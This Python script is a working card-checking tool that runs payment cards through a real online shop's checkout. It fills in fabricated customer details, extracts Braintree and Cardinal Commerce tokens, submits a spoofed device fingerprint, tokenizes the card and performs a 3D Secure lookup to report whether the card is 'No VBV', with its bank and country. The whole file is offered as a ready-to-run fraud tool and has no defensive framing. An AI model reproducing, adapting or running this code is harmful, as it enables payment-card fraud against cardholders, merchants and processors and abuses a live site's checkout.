import httpx
import re
import random
import time
import uuid
import base64
import json
import jwt
import string

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "David", "Elizabeth"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
STREETS = ["123 Oak Street", "456 Pine Avenue", "789 Maple Drive", "321 Cedar Lane", "654 Elm Court"]
CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
STATES = ["NY", "CA", "IL", "TX", "AZ"]
ZIPS = ["10001", "90001", "60601", "77001", "85001"]


def random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    return f"{name}@gmail.com"


async def vbv_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 4:
        yy = yy[-2:]
    mm = mm.zfill(2)

    idx = random.randint(0, len(FIRST_NAMES) - 1)
    first = FIRST_NAMES[idx]
    last = LAST_NAMES[idx]
    street = random.choice(STREETS)
    city = random.choice(CITIES)
    state = random.choice(STATES)
    zipcode = random.choice(ZIPS)
    phone = f"+1{random.randint(2000000000, 9999999999)}"
    email = random_email()
    session_id = str(uuid.uuid4())
    consumer_session = f"0_{uuid.uuid4()}"
    bin_session = str(uuid.uuid4())
    tid = f"Tid-{uuid.uuid4()}"
    fingerprint = uuid.uuid4().hex[:32]

    base_headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': UA,
        'x-requested-with': 'XMLHttpRequest',
    }

    client_kwargs = dict(timeout=httpx.Timeout(45.0), follow_redirects=True, verify=False)
    if proxy:
        client_kwargs["proxy"] = proxy

    try:
        async with httpx.AsyncClient(**client_kwargs) as client:

            add_cart_headers = {
                **base_headers,
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://shop.acumedic.com',
                'phpr-event-handler': 'ev{onHandleRequest}',
                'phpr-postback': '1',
                'phpr-remote-event': '1',
                'referer': 'https://shop.acumedic.com/product/cup-gl4/',
            }

            r1 = await client.get('https://shop.acumedic.com/product/cup-gl4/', headers={
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': UA,
            })

            ls_key_match = re.search(r"ls_session_key['\"]?\s*[:=]\s*['\"]([^'\"]+)", r1.text)
            ls_key = ls_key_match.group(1) if ls_key_match else f"lsk{uuid.uuid4().hex[:20]}"

            add_data = {
                'cms_handler_name': 'shop:on_addToCart',
                'ls_session_key': ls_key,
                'product_cart_quantity': '1',
                'product_id': '143',
            }
            await client.post('https://shop.acumedic.com/product/cup-gl4/', headers=add_cart_headers, data=add_data)

            nav_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'user-agent': UA,
                'upgrade-insecure-requests': '1',
            }
            await client.get('https://shop.acumedic.com/checkout/%7ccheckout%7cbegin/', headers=nav_headers)

            checkout_headers = {
                **base_headers,
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://shop.acumedic.com',
                'phpr-event-handler': 'ev{onHandleRequest}',
                'phpr-postback': '1',
                'phpr-remote-event': '1',
                'referer': 'https://shop.acumedic.com/checkout/%7ccheckout%7cbegin/',
            }

            billing_data = {
                'cms_handler_name': 'on_action',
                'ls_session_key': ls_key,
                'x_custaccgen_salutation': 'Mr',
                'first_name': first,
                'last_name': last,
                'phone': phone,
                'company': '',
                'street_address': street,
                'city': city,
                'zip': zipcode,
                'country': '1',
                'state': '1',
                'checkout__input--step-number': '1',
                'checkout_step': 'billing_info',
                'auto_skip_shipping': '1',
                'register_customer': '1',
                'customer_auto_login': '1',
                'customer_registration_notification': '1',
                'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
            }
            await client.post('https://shop.acumedic.com/checkout/', headers=checkout_headers, data=billing_data)

            checkout_headers['referer'] = 'https://shop.acumedic.com/checkout/2/'
            shipping_data = {
                'cms_handler_name': 'on_action',
                'ls_session_key': ls_key,
                'first_name': first,
                'last_name': last,
                'phone': phone,
                'company': '',
                'street_address': street,
                'city': city,
                'zip': zipcode,
                'country': '1',
                'state': '1',
                'checkout__input--step-number': '2',
                'checkout_step': 'shipping_info',
                'auto_skip_shipping': '1',
                'register_customer': '1',
                'customer_auto_login': '1',
                'customer_registration_notification': '1',
                'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
            }
            ship_resp = await client.post('https://shop.acumedic.com/checkout', headers=checkout_headers, data=shipping_data)

            ship_opt_match = re.search(r'name="shipping_option"\s+value="([^"]+)"', ship_resp.text)
            ship_opt = ship_opt_match.group(1) if ship_opt_match else '44_9934f5593bd2a63869c6c98474a3485c'

            checkout_headers['referer'] = 'https://shop.acumedic.com/checkout/3/'
            shipping_method_data = {
                'cms_handler_name': 'on_action',
                'ls_session_key': ls_key,
                'shipping_option': ship_opt,
                'customer_notes': '',
                'checkout__input--step-number': '3',
                'checkout_step': 'shipping_method',
                'auto_skip_shipping': '1',
                'register_customer': '1',
                'customer_auto_login': '1',
                'customer_registration_notification': '1',
                'cms_update_elements[checkout__dynamic]': 'checkout:stepload',
            }
            step3_resp = await client.post('https://shop.acumedic.com/checkout', headers=checkout_headers, data=shipping_method_data)

            token_match = re.search(r'client_token["\']?\s*(?:value=|[=:])\s*["\']([A-Za-z0-9+/=]+)', step3_resp.text)
            if not token_match:
                token_match = re.search(r'name="client_token"\s+value="([^"]+)"', step3_resp.text)
            if not token_match:
                elapsed = round(time.time() - start, 2)
                return f"Error - Could not get Braintree token [{elapsed}s]"

            client_token = token_match.group(1)
            decoded_token = base64.b64decode(client_token).decode('utf-8')
            auth_fp_match = re.findall(r'"authorizationFingerprint":"([^"]+)"', decoded_token)
            if not auth_fp_match:
                elapsed = round(time.time() - start, 2)
                return f"Error - Could not get auth fingerprint [{elapsed}s]"

            au = auth_fp_match[0]

            bt_headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://shop.acumedic.com',
                'referer': 'https://shop.acumedic.com/checkout/4/',
                'user-agent': UA,
                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
            }

            config_query = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': session_id,
                },
                'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
                'operationName': 'ClientConfiguration',
            }

            config_resp = await client.post('https://payments.braintree-api.com/graphql', headers=bt_headers, json=config_query)
            config_data = config_resp.json()

            try:
                cardinal_jwt = config_data['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
            except (KeyError, TypeError):
                elapsed = round(time.time() - start, 2)
                return f"Error - Could not get Cardinal JWT [{elapsed}s]"

            cardinal_init_headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://shop.acumedic.com',
                'referer': 'https://shop.acumedic.com/checkout/4/',
                'user-agent': UA,
                'x-cardinal-tid': tid,
                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
            }

            init_payload = {
                'BrowserPayload': {
                    'Order': {
                        'OrderDetails': {},
                        'Consumer': {
                            'BillingAddress': {},
                            'ShippingAddress': {},
                            'Account': {},
                        },
                        'Cart': [],
                        'Token': {},
                        'Authorization': {},
                        'Options': {},
                        'CCAExtension': {},
                    },
                    'SupportsAlternativePayments': {
                        'cca': True,
                        'hostedFields': False,
                        'applepay': False,
                        'discoverwallet': False,
                        'wallet': False,
                        'paypal': False,
                        'visacheckout': False,
                    },
                },
                'Client': {
                    'Agent': 'SongbirdJS',
                    'Version': '1.35.0',
                },
                'ConsumerSessionId': consumer_session,
                'ServerJWT': cardinal_jwt,
            }

            init_resp = await client.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=cardinal_init_headers, json=init_payload)
            init_data = init_resp.json()

            try:
                cardinal_response_jwt = init_data['CardinalJWT']
                payload_dict = jwt.decode(cardinal_response_jwt, options={"verify_signature": False})
                reference_id = payload_dict['ReferenceId']
            except (KeyError, jwt.DecodeError):
                elapsed = round(time.time() - start, 2)
                return f"Error - Cardinal init failed [{elapsed}s]"

            dfp_headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://geo.cardinalcommerce.com',
                'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8a9893adb1562e003c26a6&tmEventType=PAYMENT&referenceId={consumer_session}&geolocation=false&origin=Songbird',
                'user-agent': UA,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            }

            dfp_payload = {
                'Cookies': {
                    'Legacy': True,
                    'LocalStorage': True,
                    'SessionStorage': True,
                },
                'DeviceChannel': 'Browser',
                'Extended': {
                    'Browser': {
                        'Adblock': True,
                        'AvailableJsFonts': [],
                        'DoNotTrack': 'unknown',
                        'JavaEnabled': False,
                    },
                    'Device': {
                        'ColorDepth': 24,
                        'Cpu': 'unknown',
                        'Platform': 'Win32',
                        'TouchSupport': {
                            'MaxTouchPoints': 0,
                            'OnTouchStartAvailable': False,
                            'TouchEventCreationSuccessful': False,
                        },
                    },
                },
                'Fingerprint': fingerprint,
                'FingerprintingTime': random.randint(800, 2000),
                'FingerprintDetails': {
                    'Version': '1.5.1',
                },
                'Language': 'en',
                'Latitude': None,
                'Longitude': None,
                'OrgUnitId': '5c8a9893adb1562e003c26a6',
                'Origin': 'Songbird',
                'Plugins': [
                    'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                ],
                'ReferenceId': reference_id,
                'Referrer': 'https://shop.acumedic.com/checkout/4/',
                'Screen': {
                    'FakedResolution': False,
                    'Ratio': 1.7777777777777777,
                    'Resolution': '1920x1080',
                    'UsableResolution': '1920x1040',
                    'CCAScreenSize': '02',
                },
                'CallSignEnabled': None,
                'ThreatMetrixEnabled': False,
                'ThreatMetrixEventType': 'PAYMENT',
                'ThreatMetrixAlias': 'Default',
                'TimeOffset': -300,
                'UserAgent': UA,
                'UserAgentDetails': {
                    'FakedOS': False,
                    'FakedBrowser': False,
                },
                'BinSessionId': bin_session,
            }

            await client.post(
                'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
                headers=dfp_headers,
                json=dfp_payload,
            )

            tokenize_headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': UA,
                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
            }

            tokenize_payload = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': session_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            tok_resp = await client.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=tokenize_payload)
            tok_data = tok_resp.json()

            try:
                tok = tok_data['data']['tokenizeCreditCard']['token']
                card_info = tok_data['data']['tokenizeCreditCard']['creditCard']
                bin_data = card_info.get('binData', {})
                brand_code = card_info.get('brandCode', 'Unknown')
                card_last4 = card_info.get('last4', cc[-4:])
                issuing_bank = bin_data.get('issuingBank', 'Unknown')
                country_of_issuance = bin_data.get('countryOfIssuance', 'Unknown')
                card_type = 'Debit' if bin_data.get('debit') == 'Yes' else 'Credit'
                prepaid = bin_data.get('prepaid', 'Unknown')
            except (KeyError, TypeError):
                elapsed = round(time.time() - start, 2)
                return f"Error - Card tokenization failed [{elapsed}s]"

            lookup_headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://shop.acumedic.com',
                'referer': 'https://shop.acumedic.com/checkout/4/',
                'user-agent': UA,
                'sec-ch-ua': '"Google Chrome";v="131", "Not=A?Brand";v="8", "Chromium";v="131"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
            }

            lookup_payload = {
                'amount': '14.95',
                'browserColorDepth': 24,
                'browserJavaEnabled': False,
                'browserJavascriptEnabled': True,
                'browserLanguage': 'en',
                'browserScreenHeight': 1080,
                'browserScreenWidth': 1920,
                'browserTimeZone': -300,
                'deviceChannel': 'Browser',
                'additionalInfo': {
                    'workPhoneNumber': None,
                    'shippingGivenName': first,
                    'shippingSurname': last,
                    'shippingPhone': phone,
                    'acsWindowSize': '03',
                    'billingLine1': street,
                    'billingLine2': None,
                    'billingCity': city,
                    'billingState': state,
                    'billingPostalCode': zipcode,
                    'billingCountryCode': 'US',
                    'billingPhoneNumber': phone,
                    'billingGivenName': first,
                    'billingSurname': last,
                    'shippingLine1': street,
                    'shippingLine2': None,
                    'shippingCity': city,
                    'shippingState': state,
                    'shippingPostalCode': zipcode,
                    'shippingCountryCode': 'US',
                    'email': email,
                },
                'bin': cc[:6],
                'dfReferenceId': reference_id,
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.99.0',
                    'cardinalDeviceDataCollectionTimeElapsed': random.randint(300, 600),
                    'issuerDeviceDataCollectionTimeElapsed': random.randint(2000, 5000),
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': au,
                'braintreeLibraryVersion': 'braintree/web/3.99.0',
                '_meta': {
                    'merchantAppId': 'shop.acumedic.com',
                    'platform': 'web',
                    'sdkVersion': '3.99.0',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': session_id,
                },
            }

            lookup_resp = await client.post(
                f'https://api.braintreegateway.com/merchants/msf5rf5mg5f3y6fy/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
                headers=lookup_headers,
                json=lookup_payload,
            )

            elapsed = round(time.time() - start, 2)
            lookup_data = lookup_resp.json()

            try:
                three_ds_info = lookup_data['paymentMethod']['threeDSecureInfo']
                status = three_ds_info.get('status', 'unknown')
                enrolled = three_ds_info.get('enrolled', 'unknown')
                liability_shifted = three_ds_info.get('liabilityShifted', False)
                liability_shift_possible = three_ds_info.get('liabilityShiftPossible', False)
            except (KeyError, TypeError):
                error_msg = lookup_data.get('error', {}).get('message', str(lookup_data)[:100])
                return f"Error - 3DS lookup failed: {error_msg} [{elapsed}s]"

            info = f"Type: {card_type} | Country: {country_of_issuance} | Bank: {issuing_bank}"

            non_vbv_statuses = [
                'authenticate_successful', 'authenticate_attempt_successful',
                'lookup_not_enrolled', 'lookup_bypassed',
                'authentication_unavailable', 'skipped_due_to_rule',
                'authenticate_unable_to_authenticate',
            ]
            vbv_enrolled_statuses = [
                'challenge_required',
            ]
            declined_statuses = [
                'authenticate_rejected', 'authenticate_frictionless_failed',
            ]
            error_statuses = [
                'lookup_card_error', 'lookup_error',
            ]

            if status in non_vbv_statuses:
                return f"3d Passed (No VBV) | {info} [{elapsed}s]"
            elif status in vbv_enrolled_statuses:
                return f"3DS Challenge Required (VBV Enrolled) | {info} [{elapsed}s]"
            elif status in declined_statuses:
                return f"3DS Rejected | {info} [{elapsed}s]"
            elif status in error_statuses:
                return f"3DS Lookup Error | {info} [{elapsed}s]"
            else:
                return f"3d Passed (No VBV) | {info} [{elapsed}s]"

    except httpx.TimeoutException:
        elapsed = round(time.time() - start, 2)
        return f"Error - Gateway timeout [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:120]} [{elapsed}s]"
